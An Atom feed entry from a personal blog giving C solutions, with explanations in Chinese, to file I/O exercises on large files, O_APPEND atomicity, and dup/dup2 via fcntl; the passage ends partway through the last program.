<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jingtianer</title>
  
  <subtitle>A cat coder</subtitle>
  <link href="https://jingtianer.github.io/home/atom.xml" rel="self"/>
  
  <link href="https://jingtianer.github.io/home/"/>
  <updated>2023-03-23T12:52:38.648Z</updated>
  <id>https://jingtianer.github.io/home/</id>
  
  <author>
    <name>Meow Meow Liu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>cha5.深入探究文件IO</title>
    <link href="https://jingtianer.github.io/home/2023/03/23/linux/Linux-UNIX%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E6%89%8B%E5%86%8C/cha5/"/>
    <id>https://jingtianer.github.io/home/2023/03/23/linux/Linux-UNIX%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E6%89%8B%E5%86%8C/cha5/</id>
    <published>2023-03-23T10:05:00.000Z</published>
    <updated>2023-03-23T12:52:38.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h2><blockquote><p>请使用标准文件IO系统调用(open()和lseek())和off_t数据类型修改程序清单5-3中的程序。将宏_FILE_OFFSET_BITS的值设置为64进行编译，并测试该程序是否能够成功创建一个大文件。</p></blockquote><p>将xxx64改为xxx，off64_t改为off_t，可以创建大文件（使用 -m32编译）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// #define _LARGEFILE64_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _FILE_OFFSET_BITS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LARGEFILE64_SOURCE</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(long) = %d, sizeof(long long) = %d, sizeof(off_t) = %d, sizeof(off64_t) = %d\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span>), <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>), <span class="built_in">sizeof</span>(<span class="type">off_t</span>), <span class="built_in">sizeof</span>(<span class="type">off64_t</span>));</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span>(argc !=<span class="number">3</span> || <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">writeErr</span>(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">writeErr</span>(<span class="string">&quot; pathname offset\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">open64</span>(argv[<span class="number">1</span>], O_RDWR | O_CREAT, S_IRUSR|S_IWUSR);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">writeErr</span>(<span class="string">&quot;open64 fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">off64_t</span> off = <span class="built_in">atoll</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">lseek64</span>(fd, off, SEEK_SET) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">writeErr</span>(<span class="string">&quot;lseek64&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">write</span>(fd, <span class="string">&quot;test&quot;</span>, <span class="number">4</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">writeErr</span>(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _FILE_OFFSET_BITS</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(long) = %d, sizeof(long long) = %d, sizeof(off_t) = %d\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span>), <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>), <span class="built_in">sizeof</span>(<span class="type">off_t</span>));</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span>(argc !=<span class="number">3</span> || <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">writeErr</span>(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">writeErr</span>(<span class="string">&quot; pathname offset\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">open</span>(argv[<span class="number">1</span>], O_RDWR | O_CREAT, S_IRUSR|S_IWUSR);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">writeErr</span>(<span class="string">&quot;open64 fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">off_t</span> off = <span class="built_in">atoll</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">lseek</span>(fd, off, SEEK_SET) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">writeErr</span>(<span class="string">&quot;lseek64&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">write</span>(fd, <span class="string">&quot;test&quot;</span>, <span class="number">4</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">writeErr</span>(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> </span>&#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = <span class="built_in">write</span>(STDERR_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h2><blockquote><p>5-2.编写一个程序，使用O_APPEND标志并以写方式打开一个已存在的文件，且将文件偏移量置于文件起始处，再写入数据。数据会显示在文件中的哪个位置?为什么?</p></blockquote><p>文件末尾，在write时，lseek失效了</p><h2 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h2><blockquote><p>本习题的设计目的在于展示为何以O_APPEND标志打开文件来保障操作的原子性是必要的。请编写一程序，可接收多达3个命令行参数:</p></blockquote><blockquote><p>$ atomic_append filename num-bytes [x]</p></blockquote><blockquote><p>该程序应打开所指定的文件(如有必要，则创建之)，然后以每次调用write()写入一个字节的方式，向文件尾部追加num-bytes个字节。缺省情况下，程序使用O_APPEND标志打开文件，但若存在第三个命令行参数(x)，那么打开文件时将不再使用O_APPEND标志，代之以在每次调用write(前调用lseek(fd,0,SEEK_END))。同时运行该程序的两个实例，不带x参数，将100万个字节写入同一文件:</p></blockquote><blockquote><p>$ atomic_append f1 10000oo &amp; atomic_append f1 1000000</p></blockquote><blockquote><p>重复上述操作，将数据写入另一文件，但运行时加入x参数:</p></blockquote><blockquote><p>$ atomic_append f2 1000000 x &amp;  atomic_append f2 1000000 x</p></blockquote><blockquote><p>使用ls-1命令检查文件f1和f2的大小，并解释两文件大小不同的原因,</p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">writeMeow</span><span class="params">(<span class="type">int</span> __fd, <span class="type">const</span> <span class="type">void</span> *__buf, <span class="type">size_t</span> __n, <span class="type">int</span> argc)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>((argc !=<span class="number">4</span> &amp;&amp; argc != <span class="number">5</span>) || <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        writeErr(argv[<span class="number">0</span>]);</span><br><span class="line">        writeErr(<span class="string">&quot; pathname string num [x]\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> fd = open(argv[<span class="number">1</span>], O_RDWR | O_CREAT | (argc == <span class="number">5</span> ? <span class="number">0</span> : O_APPEND), S_IRUSR|S_IWUSR);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        writeErr(<span class="string">&quot;open64 fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> off = atoll(argv[<span class="number">3</span>]);</span><br><span class="line">    <span class="type">int</span> argv2len = <span class="built_in">strlen</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; off; i++)</span><br><span class="line">        <span class="keyword">if</span>(writeMeow(fd, argv[<span class="number">2</span>], argv2len, argc) == <span class="number">-1</span>) &#123;</span><br><span class="line">            writeErr(<span class="string">&quot;writeMeow&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDERR_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">writeMeow</span><span class="params">(<span class="type">int</span> __fd, <span class="type">const</span> <span class="type">void</span> *__buf, <span class="type">size_t</span> __n, <span class="type">int</span> argc)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">5</span>) lseek(__fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    write(__fd, __buf, __n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./practice5.3 f5.3 <span class="string">&quot;Meow &quot;</span> 1048576 &amp; ./practice5.3 f5.3 <span class="string">&quot;Woof &quot;</span> 1048576</span><br><span class="line">$ ./practice5.3 f5.3x <span class="string">&quot;Meow &quot;</span> 1048576 x &amp; ./practice5.3 f5.3x <span class="string">&quot;Woof &quot;</span> 1048576 x</span><br><span class="line">$ ll -h</span><br><span class="line">-rw------- 1 root root  10M Mar 23 20:17 f5.3</span><br><span class="line">-rw------- 1 root root 5.9M Mar 23 20:17 f5.3x</span><br></pre></td></tr></table></figure><h3 id="解释原因"><a href="#解释原因" class="headerlink" title="解释原因"></a>解释原因</h3><p>不加x的10M，加x的5.9M</p><p>通过计算，如果所有数据正常写入，那么文件大小应该刚好是10M</p><p>加X的指针移动和写入不具有原子性，可能存在两个进程同时向同一偏移量处写入数据，相互覆盖，导致文件大小偏小。</p><p>不加X的具有原子性，指针移动和写入不会打断，不会在同一位置写入</p><h2 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h2><blockquote><p>使用fcntl()和 close()(若有必要)来实现 dupO和 dup2()。(对于某些错误，dup2()和fentl()返回的errno值并不相同，此处可不予考虑。)务必牢记dup2()需要处理的一种特殊情况，即 oldfd与 newfd相等。这时，应检查oldfd是否有效，测试fcntl(oldfd，F_GETFL)是否成功就能达到这一目的。若oldfd无效，则dup2()将返回-1，并将errno置为EBADF。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">int</span> exitCode, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> __dup(<span class="type">int</span> oldfd);</span><br><span class="line"><span class="type">int</span> __dup2(<span class="type">int</span> oldfd, <span class="type">int</span> newfd);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dupStdout = __dup(STDOUT_FILENO);</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Jingtianer\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Jingtianer\n&quot;</span>));</span><br><span class="line">    write(dupStdout, <span class="string">&quot;Jingtianer\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Jingtianer\n&quot;</span>));</span><br><span class="line">    dupStdout = __dup2(STDOUT_FILENO, dupStdout);</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Jingtianer\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Jingtianer\n&quot;</span>));</span><br><span class="line">    write(dupStdout, <span class="string">&quot;Jingtianer\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Jingtianer\n&quot;</span>));</span><br><span class="line">    <span class="type">char</span> tmpfile[] = <span class="string">&quot;JingtianTmpXXXXXX&quot;</span>;</span><br><span class="line">    <span class="type">int</span> tmpfd = mkstemp(tmpfile);</span><br><span class="line">    dupStdout = __dup2(STDOUT_FILENO, tmpfd);</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Jingtianer\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Jingtianer\n&quot;</span>));</span><br><span class="line">    write(tmpfd, <span class="string">&quot;Jingtianer\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Jingtianer\n&quot;</span>));</span><br><span class="line">    unlink(tmpfile);</span><br><span class="line">    close(tmpfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __dup(<span class="type">int</span> oldfd) &#123;</span><br><span class="line">    <span class="keyword">return</span> fcntl(oldfd, F_DUPFD, oldfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __dup2(<span class="type">int</span> oldfd, <span class="type">int</span> newfd) &#123;</span><br><span class="line">    <span class="keyword">if</span>(oldfd != newfd) &#123;</span><br><span class="line">        close(newfd);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(fcntl(oldfd, F_GETFL) == <span class="number">-1</span>) &#123;</span><br><span class="line">        errno = EBADF;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fcntl(oldfd, F_DUPFD, newfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">int</span> exitCode, <span class="type">const</span> <span class="type">char</span> *format, ...)</span> &#123;</span><br><span class="line">    va_list va;</span><br><span class="line">    va_start(va, format);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, format, va);</span><br><span class="line">    va_end(va);</span><br><span class="line">    <span class="built_in">exit</span>(exitCode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="练习5"><a href="#练习5" class="headerlink" title="练习5"></a>练习5</h2><blockquote><p>编写一程序，验证文件描述符及其副本是否共享了文件偏移量和打开文件的状态标志。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true <span class="string">&#x27;\1&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false <span class="string">&#x27;\0&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">int</span> exitCode, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> fd1, <span class="type">int</span> fd2)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">int</span> exitCode, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool2str(x) (x == true ? <span class="string">&quot;true&quot;</span> : <span class="string">&quot;false&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">3</span>) &#123;</span><br><span class="line">        exitErr(<span class="number">1</span>, <span class="string">&quot;Usage: %s file1 file2\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> fd1 = open(argv[<span class="number">1</span>], O_CREAT | O_RDWR);</span><br><span class="line">    <span class="type">int</span> fd2 = open(argv[<span class="number">2</span>], O_CREAT | O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd1 == <span class="number">-1</span> || fd2 == <span class="number">-1</span>) &#123;</span><br><span class="line">        exitErr(<span class="number">2</span>, <span class="string">&quot;open 